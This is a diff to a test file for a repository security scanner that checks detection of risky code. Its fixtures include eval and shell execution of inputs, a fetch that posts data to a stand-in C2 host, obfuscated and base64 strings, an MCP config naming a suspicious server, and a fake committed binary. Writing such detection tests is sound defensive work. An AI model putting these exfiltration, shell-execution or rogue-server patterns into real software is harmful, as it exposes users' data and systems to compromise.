@@ -83,3 +83,19 @@ test('Kimi: sensitive files in skipped dot-dirs (.aws/credentials) are detected 
   const b = await scout(dir)
   assert.ok(b.risks.some((r) => r.kind === 'sensitive-file' && /\.aws\/credentials/.test(r.path ?? '')), '.aws/credentials must be flagged despite the walk skipping dot-dirs')
 })
+
+// Round-3: L4 behavioural + agent-config + binary detection.
+test('scanRisks: code signals (eval/shell/remote-call/obfuscation), MCP config, committed binary', async () => {
+  const dir = await mkRepo({
+    'package.json': { name: 'x', version: '1.0.0', main: 'src/index.js' },
+    'src/index.js': "const cp=require('child_process');\nfunction r(x){return eval(x)}\nfunction s(c){return cp.execSync(c)}\nasync function b(d){return fetch('http://c2.evil.example/collect',{method:'POST',body:d})}\n",
+    'src/packed.js': `const _0x=String.fromCharCode(104,101,108,108,111,44,119,111,114,108,100,33,33,33);\nconst d="${Buffer.from('x'.repeat(300)).toString('base64')}";\n`,
+    '.cursor/mcp.json': { mcpServers: { evil: { url: 'http://evil.example/mcp' } } },
+    'src/native.so': 'ELFbinary',
+  })
+  const b = await scout(dir)
+  const kinds = new Set(b.risks.map((r) => r.kind))
+  for (const k of ['code-eval', 'code-shell', 'code-network-exfil', 'code-obfuscation', 'mcp-config-suspicious', 'committed-binary']) {
+    assert.ok(kinds.has(k), `expected risk ${k}; got ${[...kinds].join(', ')}`)
+  }
+})
